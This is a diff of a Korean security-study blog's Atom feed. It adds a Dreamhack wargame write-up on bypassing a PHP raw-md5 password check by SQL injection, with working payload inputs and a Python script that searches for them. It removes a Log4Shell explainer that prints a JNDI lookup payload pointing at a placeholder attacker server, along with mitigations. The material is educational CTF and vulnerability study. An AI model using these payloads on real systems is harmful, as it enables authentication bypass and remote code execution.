@@ -1,5 +1,149 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-09-11T15:47:03+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<pre><code class="language-mermaild!">sequenceDiagram
-</code></pre>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[오직 로컬에서만 되냐 젠장]]></summary></entry><entry><title type="html">PHP 비교연산자</title><link href="http://localhost:4000/dreamhack/php%EB%B9%84%EA%B5%90%EC%97%B0%EC%82%B0%EC%9E%90/" rel="alternate" type="text/html" title="PHP 비교연산자" /><published>2023-09-11T00:00:00+09:00</published><updated>2023-09-11T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/php%EB%B9%84%EA%B5%90%EC%97%B0%EC%82%B0%EC%9E%90</id><content type="html" xml:base="http://localhost:4000/dreamhack/php%EB%B9%84%EA%B5%90%EC%97%B0%EC%82%B0%EC%9E%90/"><![CDATA[<ul>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-09-12T16:01:01+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<pre><code class="language-mermaild!">sequenceDiagram
+</code></pre>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[오직 로컬에서만 되냐 젠장]]></summary></entry><entry><title type="html">PHP md5 (SQL Injection)</title><link href="http://localhost:4000/dreamhack/SQLiPHPmd5/" rel="alternate" type="text/html" title="PHP md5 (SQL Injection)" /><published>2023-09-12T00:00:00+09:00</published><updated>2023-09-12T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/SQLiPHPmd5</id><content type="html" xml:base="http://localhost:4000/dreamhack/SQLiPHPmd5/"><![CDATA[<h2 id="문제">문제</h2>
+<ul>
+  <li><a href="https://dreamhack.io/wargame/challenges/337">wargame.kr md5 password 워게임 Dreamhack</a></li>
+</ul>
+
+<h2 id="php-md5">PHP md5</h2>
+<ul>
+  <li>md5 해시화를 이용하여 sql injection 공격을 시도할 수 있다.</li>
+</ul>
+
+<h3 id="분석">분석</h3>
+<ul>
+  <li>php 의 md5 기능을 이용하여 사용자의 입력을 해시화 한다.</li>
+  <li>해시화 한 값을 이용하여 password 와 비교한다.</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span><span class="err"> </span><span class="o">*</span><span class="err"> </span><span class="k">from</span><span class="err"> </span><span class="n">admin_password</span><span class="err"> </span><span class="k">where</span><span class="err"> </span><span class="n">password</span><span class="o">=</span><span class="s1">'".md5($ps,true)."'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>md5(입력,true) : 16자리의 바이너리를 반환한다.</li>
+  <li>md5(입력,flase) : 32 문자열 16진수를 반환한다.</li>
+</ul>
+
+<h3 id="공격">공격</h3>
+
+<h4 id="방법-1--or">방법 1 : or</h4>
+<ul>
+  <li>or 을 이용하여 password 인증을 우회해보자.</li>
+  <li>사용자의 입력을 md5 해시화를 진행하여 완성된 값에 <code class="language-plaintext highlighter-rouge">'or'</code> 이 존재하면 된다.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md5(입력,true)= aaa'or'bbb
+
+select * from admin_password where password='aaa'or'bbb'
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>or 앞 부분이 False 여도 뒷 부분이 true 이기 때문에 비밀번호 인증 우회가 가능하다.</p>
+  </li>
+  <li>
+    <p>sql injection 공격 payload.</p>
+  </li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>129581926211651571912466741651878684928
+
+md5 = �T0D��o#��'or'8
+</code></pre></div></div>
+
+<h4 id="방법-2--">방법 2 : =</h4>
+<ul>
+  <li>= 을 이용하여 password 인증을 우회해보자.</li>
+  <li>사용자의 입력을 md5 해시화를 진행하여 완성된 값에 <code class="language-plaintext highlighter-rouge">'='문자</code> 이 존재하면 된다.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>md5(입력,true) = asdfaskd'='asdf
+
+select * from admin_password where password='asdfaskd'='asdf'
+</code></pre></div></div>
+
+<ul>
+  <li>원리</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>where password='asdfaskd'='asdf'
+
+는 먼저 앞 부분을 비교한다.
+
+where (password='asdfaskd')='asdf'
+
+where false='asdf' 
+
+여기서 mysql false 의 타입은 tinyint 이고 값은 0 이다.
+'asdf' 타입을 SIGNED 즉 int 형으로 바꿔서 비교를 진행한다.
+
+따라서 비교하는 값은 다음과 같다.
+
+where 0=0
+</code></pre></div></div>
+
+<ul>
+  <li>직접 확인하기.</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">false</span><span class="o">=</span><span class="s1">'123'</span><span class="p">;</span>
+<span class="err">출력</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">select</span> <span class="k">false</span><span class="o">=</span><span class="s1">'aaaa'</span><span class="p">;</span>
+<span class="err">출력</span> <span class="o">=</span> <span class="mi">1</span>
+</code></pre></div></div>
+
+<ul>
+  <li>여기서 주의해야 할 점이 있는데 <code class="language-plaintext highlighter-rouge">'123adfsf'</code> 와 같은 형태를 int 형으로 타입 변환하면 123 으로 변환되는 것을 확인할 수 있다.</li>
+</ul>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">cast</span><span class="p">(</span><span class="s1">'123asdf'</span> <span class="k">as</span> <span class="nb">SIGNED</span><span class="p">);</span>
+<span class="err">출력</span> <span class="o">=</span> <span class="mi">123</span>
+</code></pre></div></div>
+
+<ul>
+  <li>sql injection 공격 payload.</li>
+</ul>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>98750788
+md5 = n�A�nI�^���h'='
+
+하지만 다음 값은 실패한다.
+38106544
+md5 = &amp;�p'='63@-��
+
+왜냐하면
+1. select * from admin_password where password='&amp;�p'='63@-��'
+2. select * from admin_password where false='63@-��'
+3. select * from admin_password where false=63
+4. select * from admin_password where 0=63
+
+0과 63을 비교하는 형태가 되기 때문이다.
+</code></pre></div></div>
+
+<h3 id="평문-값-찾기">평문 값 찾기</h3>
+<ul>
+  <li>python 을 이용하여 <code class="language-plaintext highlighter-rouge">'='</code> 값이 들어가는 평문 값을 쉽게 찾아줄 수 있다.</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
+
+<span class="n">key1</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"'='"</span>
+<span class="n">key2</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"'or'"</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100_000_000</span><span class="p">):</span>
+<span class="err"> </span> <span class="err"> </span> <span class="n">e</span> <span class="o">=</span> <span class="nf">md5</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">digest</span><span class="p">()</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="n">key1</span> <span class="ow">in</span> <span class="n">e</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">key1</span><span class="si">}</span><span class="s"> : </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+<span class="err"> </span> <span class="err"> </span> <span class="k">elif</span> <span class="n">key2</span> <span class="ow">in</span> <span class="n">e</span><span class="p">:</span>
+<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">key2</span><span class="si">}</span><span class="s"> : </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="참고-사이트">참고 사이트</h2>
+<ul>
+  <li><a href="https://heavening.tistory.com/85">int의 종류 및 크기 tinyint, smallint, int, bigint 초간단 정리 (tistory.com)</a></li>
+  <li><a href="https://www.php.net/manual/en/function.md5.php">PHP: md5 - Manual</a></li>
+  <li><a href="https://onecompiler.com/mysql">mysql 온라인 컴파일러</a></li>
+  <li><a href="https://cvk.posthaven.com/sql-injection-with-raw-md5-hashes">SQL injection with raw MD5 hashes (Leet More CTF 2010 injection 300) - Christian von Kleist (posthaven.com)</a></li>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="md5" /><category term="sqli" /><summary type="html"><![CDATA[php 의 md5 기능을 우회하여 sql injection 공격을 시도해보자.]]></summary></entry><entry><title type="html">PHP 비교연산자</title><link href="http://localhost:4000/dreamhack/php%EB%B9%84%EA%B5%90%EC%97%B0%EC%82%B0%EC%9E%90/" rel="alternate" type="text/html" title="PHP 비교연산자" /><published>2023-09-11T00:00:00+09:00</published><updated>2023-09-11T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/php%EB%B9%84%EA%B5%90%EC%97%B0%EC%82%B0%EC%9E%90</id><content type="html" xml:base="http://localhost:4000/dreamhack/php%EB%B9%84%EA%B5%90%EC%97%B0%EC%82%B0%EC%9E%90/"><![CDATA[<ul>
   <li>php 에 존재하는 취약점이다!</li>
 </ul>
 
@@ -515,102 +659,4 @@ if($json-&gt;key == "xyz") 비교 하면
 <h2 id="참고-사이트">참고 사이트</h2>
 <ul>
   <li><a href="https://private.tistory.com/63">여러개 한번에 insert 하기</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="sqli" /><summary type="html"><![CDATA[tmitter 문제 풀이.]]></summary></entry><entry><title type="html">CVE-2021-44228 Log4shell 취약점에 대하여 알아보자.</title><link href="http://localhost:4000/log4shell%EC%B7%A8%EC%95%BD%EC%A0%90%EC%9D%B4%EB%A1%A0/" rel="alternate" type="text/html" title="CVE-2021-44228 Log4shell 취약점에 대하여 알아보자." /><published>2023-08-17T00:00:00+09:00</published><updated>2023-08-17T23:13:00+09:00</updated><id>http://localhost:4000/log4shell%EC%B7%A8%EC%95%BD%EC%A0%90%EC%9D%B4%EB%A1%A0</id><content type="html" xml:base="http://localhost:4000/log4shell%EC%B7%A8%EC%95%BD%EC%A0%90%EC%9D%B4%EB%A1%A0/"><![CDATA[<h2 id="cve-2021-44228-log4shell-취약점">CVE-2021-44228 Log4Shell 취약점</h2>
-
-<h3 id="취약점-정보">취약점 정보</h3>
-<ul>
-  <li>Apache Log4j 의 JNDI(Java Naming and Directory Interface) Injection 취약점이다.</li>
-  <li>영향을 받는 Apache Log4j 버전의 메세지에 신뢰할 수 없는 데이터(악성 페이로드)를 포함함으로써 공격자는 JNDI 조회를 악성 서버에 연결할 수 있다.</li>
-  <li>RCE ( Remote Code Excution ) 즉 원격으로 악성 코드를 서버에서 실행시킬 수 있다.</li>
-  <li>원격으로 악성 코드를 서버로 다운로드 및 실행 시키는 공격이다.</li>
-</ul>
-
-<h3 id="취약점-버전">취약점 버전</h3>
-<ul>
-  <li>Log4j2 &lt;= 2.14.1</li>
-  <li>jdk version &lt; 6u211, 7u201, 8u191, 11.0.1</li>
-</ul>
-
-<h3 id="보안-취약점-원인">보안 취약점 원인</h3>
-<h4 id="log4j의-message-lookup-기능과-lookups의-jndi-기능">Log4j의 Message Lookup 기능과 Lookups의 JNDI 기능</h4>
-<ul>
-  <li>Message Lookup 패턴 기능과 Lookup의 JNDI기능 때문에 발생하는 취약점이다.</li>
-  <li>원래 서버 내부에서 운영중인 LDAP 서버에 접속하여 코드를 서버로 다운로드 및 실행시키는 기능이다.</li>
-  <li>공격자는 이를 악용하여 공격자의 LDAP 서버에 접속하여 악성 코드를 서버로 다운로드 및 실행 시킨다.</li>
-  <li>취약한 코드 예시. Message Lookup 기능과 Lookup의 JNDI 기능을 이용한 공격이다.</li>
-  <li>공격자의 payload 가 log 메세지에 삽입되어 발생되는 공격이다.</li>
-</ul>
-
-<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">log</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="s">"test "</span><span class="o">+</span><span class="s">"${jndi:ldap://공격자 서버}"</span><span class="o">);</span>
-</code></pre></div></div>
-
-<h3 id="jndi-란">JNDI 란?</h3>
-<ul>
-  <li>java 로 작성된 에플리케이션을 DNS, LDAP, RMI, NDS 등과 같은 Naming / Directory 서비스에 연결하기  위한 API 이다.</li>
-</ul>
-
-<h3 id="ldap-란">LDAP 란?</h3>
-<ul>
-  <li>Lightweight Directory Access Protocol 경량 디렉터리 엑세스 프로토콜.</li>
-  <li>디렉터리 서비스를 조회하고 수정하는 응용 프로토콜(7계층)이다.</li>
-</ul>
-
-<h3 id="log4shell공격-payload">Log4Shell공격 Payload</h3>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${jndi:ldap://공격자 서버}
-</code></pre></div></div>
-
-<h3 id="log4shell-공격-동작-방식">Log4Shell 공격 동작 방식</h3>
-<ul>
-  <li>공격자</li>
-  <li>공격자 LDAP 서버</li>
-  <li>공격자 HTTP 서버 : 악성 class 또는 jar 파일을 가지고 있는 곳이다.</li>
-  <li>취약한 웹 서버 : 취약한 버전의 log4j 버전과 jdk 버전을 이용하고 있어야 한다.</li>
-</ul>
-
-<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOybuSDshJzrsoQgOiDqs7XqsqkgUGF5bG9hZCDsoITri6xcbuybuSDshJzrsoQgLT4-IOybuSDshJzrsoQgOiBwYXlsb2Fk66W8IOuhnOq5heydhCDsnITtlbQgbG9nNGrroZwg7J2R64u1IOuNsOydtO2EsCDsoITri6xcbuybuSDshJzrsoQgLT4-IOqzteqyqeyekCBMREFQIOyEnOuyhCA6IOyVheyEsSDrpqzrsoTsiqQg7ImYIO2MjOydvChjbGFzcyBvciBqYXIpIOychOy5mCDsoJXrs7Qg7JqU7LKtXG7qs7XqsqnsnpAgTERBUCDshJzrsoQgLT4-IOybuSDshJzrsoQgOiDslYXshLEg7YyM7J28IOydtOumhCDrsI8g7L2U65OcIOychOy5mCDsnZHri7VcbuybuSDshJzrsoQgLT4-IOqzteqyqeyekCBIVFRQIOyEnOuyhCA6IOyVheyEsSDtjIzsnbwg64uk7Jq066Gc65OcIOyalOyyrVxu6rO16rKp7J6QIEhUVFAg7ISc67KEIC0-PiDsm7kg7ISc67KEIDog7JWF7ISxIO2MjOydvCDsnZHri7VcbuybuSDshJzrsoQgLT4-IOybuSDshJzrsoQgOiDslYXshLEg7YyM7J28IOyLpO2WiVxu7Ju5IOyEnOuyhCAtPj4g6rO16rKp7J6QIDog66as67KE7IqkIOyJmOydhCDthrXtlZwg7Jew6rKwIiwibWVybWFpZCI6bnVsbH0" /></p>
-
-<p><img src="https://user-images.githubusercontent.com/31990118/261207125-030bd82e-6262-4d7b-b52f-7e98a3fc6926.jpg" alt="log4j_attack" />
-<a href="https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/assets/log4j_attack.png">출처 : govcert</a></p>
-
-<h3 id="대응-방안">대응 방안</h3>
-<ul>
-  <li>Log4j 버전 2.10 ~ 2.14.1 을 사용할 때 대응방안.  Lookup 기능을 비활성화하기.</li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java
--Dlog4j2.formatMsgNoLookups=true
-...
-</code></pre></div></div>
-
-<p><img src="https://user-images.githubusercontent.com/31990118/261207377-549f5838-50e7-4c54-b352-20f3d45d6a54.png" alt="Pasted image 20230803170827" /></p>
-
-<ul>
-  <li>
-    <p>취약점이 해결된 Log4j 2.17 이상 버전 이용하기. 왜냐하면 2.16.0 버전에서 message lookup patterns 이 제거되었고, JNDI 기능이 디펄트로 비활성화 되어있기 때문이다.</p>
-  </li>
-  <li>
-    <p>jdk 버전 6u211, 7u201, 8u191, 11.0.1 이상으로 이용하기.  취약한 버전의 Log4j 버전을 사용하더라도 ldap.object.trustURLCodebase 의 디펄트 값이 false이기 때문에 외부에서 악성 코드를 다운로드 하지 않는다. 즉 웹 서버의 log4j는 공격자 서버에서 jar 또는 class 파일을 다운로드 받고 실행시키지 않는다.</p>
-  </li>
-  <li>
-    <p>Remote codebase 를 disable 하기. 신뢰하지 못하는 외부 서버로 부터 jar 코드를 무단으로 다운 및 실행하지 않게한는 설정이다.</p>
-  </li>
-</ul>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LDAP 기반 설정
-com.sun.jndi.ldap.object.trustURLCodebase=false
-6u211, 7u201, 8u191, 11.0.1 버전 이상부터 false 가 default이다.
-
-RMI 기반 설정
-com.sun.jndi.cosnaming.object.trustURLCodebase=false
-8u121 부터 false가 default 이다.
-</code></pre></div></div>
-
-<h3 id="참고-사이트">참고 사이트</h3>
-<ul>
-  <li><a href="https://www.lunasec.io/docs/blog/log4j-zero-day-update-on-cve-2021-45046/">Log4Shell Update: Second log4j Vulnerability Published</a></li>
-  <li><a href="https://blog.o3g.org/server/log4j-%EC%B7%A8%EC%95%BD%EC%A0%90-cve-2021-44228-%EC%9D%84-%EB%A7%89%EB%8A%94-5%EA%B0%80%EC%A7%80-%EB%B0%A9%EB%B2%95/">Log4j 취약점 (CVE-2021-44228) 을 막는 5가지 방법 (o3g.org)</a></li>
-  <li><a href="https://www.trendmicro.com/ko_kr/what-is/apache-log4j-vulnerability.html">Apache Log4J(Log4Shell) 취약점이란? (trendmicro.com)</a></li>
-  <li><a href="https://www.kisec.com/rsrh_rpt_det.do?id=783">한국정보보호교육센터 (kisec.com)</a></li>
-  <li><a href="https://ko.wikipedia.org/wiki/LDAP">LDAP - 위키백과, 우리 모두의 백과사전 (wikipedia.org)</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="java" /><category term="log4j" /><category term="log4shell" /><category term="CVE-2021-44228" /><category term="CVE" /><summary type="html"><![CDATA[Log4shell 취약점 무엇인지 정리해 보았다.]]></summary></entry></feed>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="sqli" /><summary type="html"><![CDATA[tmitter 문제 풀이.]]></summary></entry></feed>
